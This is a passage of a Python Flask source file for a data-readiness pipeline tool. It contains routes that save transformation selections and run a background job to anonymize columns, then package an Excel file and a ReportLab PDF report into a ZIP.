    selections = request.get_json()
    if selections is None:
        selections = {}

    invalidate_pipeline_stages(state, 5)   # new selections: any earlier execution result is stale
    state.user_decisions[4] = selections
    state.stage_data[4] = {
        'selected_transformations': selections,
        'completed_at': time.time()
    }
    state.current_stage = 5

    return jsonify({
        'success': True,
        'message': 'Transformation selections saved',
        'selections': selections
    })

@app.route('/pipeline/<session_id>/execute', methods=['POST'])
@api_errors
def pipeline_execute(session_id):
    """Stage 5: Execute selected transformations and generate report"""
    state = owned_pipeline_state(session_id)
    if state is None:
        return jsonify({'error': 'Pipeline session not found or expired'}), 404
    if state.stage_data[1] is None:
        return jsonify({'error': 'Run the shape analysis (stage 1) before executing the pipeline'}), 409

    progress_queue = Queue()
    register_job(session_id, progress_queue)
    @guarded_job(progress_queue, session_id)
    def run_execute():
        send_progress = lambda pct, msg: progress_queue.put({
            'stage': 'executing', 'percentage': pct, 'message': msg
        })

        send_progress(5, 'Starting pipeline execution...')

        result_df = state.df.copy()
        transformation_log = []
        selections = state.user_decisions.get(4, {})

        # Apply anonymization if selected
        if selections.get('anonymization', {}).get('enabled'):
            send_progress(20, 'Applying data anonymization...')
            anon_cols = selections['anonymization'].get('columns', [])
            if anon_cols:
                for col in anon_cols:
                    if col in result_df.columns:
                        unique_vals = result_df[col].dropna().unique()
                        mapping = {val: f"{col[:3].upper()}_{i+1:05d}" for i, val in enumerate(unique_vals)}
                        result_df[col] = result_df[col].map(lambda x: mapping.get(x, x) if pd.notna(x) else x)
                transformation_log.append({
                    'type': 'anonymization',
                    'columns': anon_cols,
                    'rows_affected': len(result_df),
                    'status': 'applied',
                    'note': 'Values replaced with consistent placeholders (e.g. NAM_00001); the same value always gets the same placeholder',
                })

        # Apply type normalization if selected
        if selections.get('normalization', {}).get('enabled'):
            send_progress(40, 'Recording type normalization...')
            norm_cols = selections['normalization'].get('columns', [])
            # Type conversion is not implemented here: use the Data Normalizer tool on the result
            if norm_cols:
                transformation_log.append({
                    'type': 'normalization',
                    'columns': norm_cols,
                    'status': 'recorded, not applied',
                    'note': 'Type conversion was not performed on the data; use the Data Normalizer tool',
                })

        # Gap handling is only reported: nothing is filled or removed
        if selections.get('gap_handling', {}).get('enabled'):
            gap_cols = selections['gap_handling'].get('columns', [])
            if gap_cols:
                transformation_log.append({
                    'type': 'gap_handling',
                    'columns': gap_cols,
                    'status': 'recorded, not applied',
                    'note': 'The gaps are documented in the report; no values were filled or rows removed',
                })

        send_progress(60, 'Generating PDF report...')

        # Generate PDF Report
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_basename = f"data_readiness_report_{timestamp}"
        pdf_path = job_output_path(session_id, f"{output_basename}.pdf")

        generate_readiness_report(
            output_path=pdf_path,
            state=state,
            transformation_log=transformation_log
        )

        send_progress(80, 'Saving transformed data...')

        # Save transformed data
        excel_path = save_table(result_df, job_output_path(session_id, f"{output_basename}_data.xlsx"), session_id,
                                log=make_log('Data Readiness Pipeline', len(state.df), len(result_df),
                                             {'transformations': transformation_log}, session_id))

        # Create ZIP package
        send_progress(90, 'Packaging results...')
        zip_path = job_output_path(session_id, f"{output_basename}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(pdf_path, f"{output_basename}_report.pdf")
            zipf.write(excel_path, os.path.basename(excel_path))

        # The report is inside the zip; the data file stays so the result can be chained into another tool
        os.remove(pdf_path)

        # Store execution results
        state.stage_data[5] = {
            'transformation_log': transformation_log,
            'output_file': f"{output_basename}.zip",
            'completed_at': time.time()
        }

        # Cache the result file
        cache_session_file(
            session_id,
            os.path.basename(excel_path),
            excel_path,
            len(result_df),
            len(result_df.columns),
            'Data Readiness Pipeline',
            owner=state.owner
        )

        progress_queue.put({
            'stage': 'done',
            'percentage': 100,
            'message': 'Pipeline execution complete',
            'download_url': job_download_url(session_id, f"{output_basename}.zip"),
            'output_filename': f"{output_basename}.zip",
            'transformation_log': transformation_log
        })


    start_job(run_execute)

    return jsonify({
        'success': True,
        'session_id': session_id,
        'message': 'Pipeline execution started'
    })

def generate_readiness_report(output_path, state, transformation_log=None):
    """Generate comprehensive Data Readiness PDF report"""
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter
    from reportlab.lib.units import inch

    doc = SimpleDocTemplate(output_path, pagesize=letter,
                           leftMargin=0.75*inch, rightMargin=0.75*inch,
                           topMargin=0.75*inch, bottomMargin=0.75*inch)

    styles = getSampleStyleSheet()
    title_style = ParagraphStyle('Title', parent=styles['Heading1'], fontSize=24, alignment=TA_CENTER, spaceAfter=20)
    heading_style = ParagraphStyle('Heading', parent=styles['Heading2'], fontSize=14, spaceBefore=15, spaceAfter=10)
    body_style = ParagraphStyle('Body', parent=styles['Normal'], fontSize=10, spaceAfter=6)

    story = []

    # Title
    story.append(Paragraph("Data Readiness Report", title_style))
    story.append(Paragraph(f"Source File: {pdf_text(str(state.filename))}", body_style))
    story.append(Paragraph(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", body_style))
    story.append(Spacer(1, 20))

    # Executive Summary
    story.append(Paragraph("1. Executive Summary", heading_style))
    analysis = (state.stage_data.get(1) or {})
    overview = analysis.get('overview', {})
    shape = overview.get('shape', {})

    summary_data = [
        ['Metric', 'Value'],
        ['Total Rows', f"{shape.get('rows', 0):,}"],
        ['Total Columns', f"{shape.get('columns', 0):,}"],
        ['Duplicate Rows', f"{overview.get('duplicate_rows', 0):,}"],
        ['Memory Usage', f"{overview.get('memory_usage_mb', 0):.2f} MB"]
    ]
    summary_table = Table(summary_data, colWidths=[2.5*inch, 2.5*inch])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#667eea')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, -1), 10),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
    ]))
    story.append(summary_table)
    story.append(Spacer(1, 20))

    # Stage 2: Gap Assessment
    story.append(Paragraph("2. Gap Assessment", heading_style))
    gap_triage = state.user_decisions.get(2, {})
    gap_summary = analysis.get('gap_summary', [])

    # Create a lookup for gap percentages
    gap_percentages = {g['column']: g['null_percentage'] for g in gap_summary}

    if gap_triage:
        # Count decisions
        needs_attention = [col for col, dec in gap_triage.items() if dec == 'needs_attention']
        acceptable = [col for col, dec in gap_triage.items() if dec == 'acceptable']

        story.append(Paragraph(f"Columns with missing data: {len(gap_triage)}", body_style))
        story.append(Paragraph(f"Marked as needing attention: {len(needs_attention)}", body_style))
        story.append(Paragraph(f"Marked as acceptable: {len(acceptable)}", body_style))
        story.append(Spacer(1, 10))

        gap_data = [['Column', 'Missing %', 'Decision']]
        for col, decision in sorted(gap_triage.items(), key=lambda x: gap_percentages.get(x[0], 0), reverse=True):
            decision_text = 'Needs Attention' if decision == 'needs_attention' else 'Acceptable'
            pct = gap_percentages.get(col, 0)
            gap_data.append([col, f"{pct:.1f}%", decision_text])

        gap_table = Table(gap_data, colWidths=[2.5*inch, 1*inch, 1.5*inch])
        gap_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#667eea')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 9),
            ('GRID', (0, 0), (-1, -1), 0.5, colors.grey),
            ('ALIGN', (1, 0), (1, -1), 'CENTER'),
        ]))
        story.append(gap_table)
    elif gap_summary:
        story.append(Paragraph(f"Found {len(gap_summary)} columns with missing data, but no triage decisions were made.", body_style))
    else:
        story.append(Paragraph("No columns with missing data were found.", body_style))
    story.append(Spacer(1, 20))

    # Stage 3: Natural Key Discovery
    story.append(Paragraph("3. Natural Key Discovery", heading_style))
    key_data = (state.stage_data.get(3) or {})
    if key_data:
        all_candidates = key_data.get('minimal_combinations', [])
        dup_rows = key_data.get('duplicate_rows', 0)
        if not all_candidates:
            all_candidates = key_data.get('minimal_combinations_after_dedup', [])
        selected_key = key_data.get('user_selected_key', all_candidates[0] if all_candidates else [])

        if selected_key:
            selected_key_str = ' + '.join(map(str, selected_key)) if isinstance(selected_key, list) else str(selected_key)
            story.append(Paragraph(f"<b>Selected Natural Key:</b> {pdf_text(selected_key_str)}", body_style))
            story.append(Spacer(1, 8))
            if dup_rows:
                story.append(Paragraph(
                    f"This column combination is unique only after removing {dup_rows:,} exact duplicate rows; "
                    "on the full data it repeats.", body_style))
            else:
                story.append(Paragraph(
                    "This column combination uniquely identifies each row in your dataset and can serve as a primary key.",
                    body_style
                ))
        if key_data.get('excluded_null_columns'):
            story.append(Spacer(1, 6))
            story.append(Paragraph("Columns skipped because they contain blank values: "
                                   + pdf_text(', '.join(map(str, key_data['excluded_null_columns']))), body_style))
        if not selected_key:
            story.append(Paragraph("No natural key was selected.", body_style))

        # Show alternative options
        if all_candidates and len(all_candidates) > 1:
            story.append(Spacer(1, 12))
            # Filter out the selected key from alternatives
            other_keys = [k for k in all_candidates if k != selected_key]
            if other_keys:
                story.append(Paragraph("<b>Other Available Keys:</b>", body_style))
                story.append(Spacer(1, 4))
                for idx, alt_key in enumerate(other_keys[:5], 1):  # Show up to 5 alternatives
                    alt_key_str = ' + '.join(map(str, alt_key)) if isinstance(alt_key, list) else str(alt_key)
                    story.append(Paragraph(f"  {idx}. {pdf_text(alt_key_str)}", body_style))
                if len(other_keys) > 5:
                    story.append(Paragraph(f"  ... and {len(other_keys) - 5} more candidate(s)", body_style))
        elif all_candidates and len(all_candidates) == 1:
            story.append(Spacer(1, 8))
            story.append(Paragraph("This was the only natural key candidate found.", body_style))
    else:
        story.append(Paragraph("Natural key discovery was not performed.", body_style))
    story.append(Spacer(1, 20))

    # Stage 4: Transformation Decisions
    story.append(Paragraph("4. Transformation Decisions", heading_style))
    transform_decisions = state.user_decisions.get(4, {})
    if transform_decisions:
        for ttype, config in transform_decisions.items():
            if config.get('enabled'):
                cols = config.get('columns', [])
                story.append(Paragraph(f"• {pdf_text(str(ttype).title())}: {len(cols)} column(s)", body_style))
    else:
        story.append(Paragraph("No transformations were selected.", body_style))
    story.append(Spacer(1, 20))

    # Stage 5: Execution Log
    story.append(Paragraph("5. Execution Log", heading_style))
    if transformation_log:
        for entry in transformation_log:
            status = entry.get('status', 'applied')
            if status == 'applied':
                line = f"• {str(entry.get('type', 'Unknown')).title()}: {len(entry.get('columns', []))} column(s) affected"
            else:
                line = f"• {str(entry.get('type', 'Unknown')).title()}: {status} ({len(entry.get('columns', []))} column(s) selected, data unchanged)"
            story.append(Paragraph(pdf_text(line), body_style))
            if entry.get('note'):
                story.append(Paragraph(f"    {pdf_text(entry['note'])}", body_style))
    else:
        story.append(Paragraph("No transformations were executed.", body_style))

    # Footer
    story.append(Spacer(1, 40))
    story.append(Paragraph("Generated by DataDragon - Data Readiness Pipeline",
                          ParagraphStyle('Footer', parent=body_style, alignment=TA_CENTER, textColor=colors.grey)))

    doc.build(story)


if __name__ == '__main__':
    # Local development server. Deployments use gunicorn (see Procfile): ONE worker with threads, because all job
    # state lives in this process's memory.
    # Only enable debug in development
    debug_mode = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
    # Port 5002 by default to avoid the macOS AirPlay Receiver on 5000; HOST stays local unless you set it.
    app.run(debug=debug_mode, host=os.environ.get('HOST', '127.0.0.1'), port=int(os.environ.get('PORT', 5002)),
            threaded=True)
